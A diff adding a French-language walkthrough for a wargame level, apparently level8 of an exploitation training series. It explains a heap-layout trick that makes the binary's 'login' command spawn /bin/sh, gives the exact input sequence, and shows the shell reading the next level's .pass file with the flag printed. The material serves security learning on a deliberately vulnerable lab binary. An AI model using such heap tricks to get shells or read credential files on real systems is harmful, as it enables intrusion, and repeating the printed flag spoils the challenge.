@@ -143,3 +143,35 @@ Dump of assembler code for function main:
    0x08048737 <+467>:   pop    %ebp
    0x08048738 <+468>:   ret    
 End of assembler dump.
+
+En lançant le programme sans arguments, le programme nous affiche la valeur de auth et de service qui sont tous les deux nuls
+Si on envoie rien alors on continue à afficher les valeurs de auth et service
+Sinon, on check ce qu'on écrit en boucle:
+- si on a écrit "auth ", on le malloc et si la chaine de caractère passée apres "auth " fait moins de 25, alors
+on copie la chaine dans auth.
+- si on écrit "reset", on free auth
+- si on écrit "service", on crée une string dans la variable service qu'on malloc avec strdup
+- si on écrit "login"
+      - si il y a quelque chose à 32 après auth, alors il y a un appel system à /bin/sh
+      - sinon, on écrit: Password:
+
+Après avoir lancé le programme, il faut donc:
+- écrire "auth "
+- écrire "service"
+- avoir malloc assez loin en mémoire pour qu'il y ait quelque chose 32 après la variable auth
+- si c'est le cas, alors on fait un appel system et on ouvre un shell
+
+-->
+auth 
+service
+service
+login
+$ pwd
+/home/user/level8
+
+$ cd level9
+$ pwd
+/home/user/level9
+
+$ cat .pass
+c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
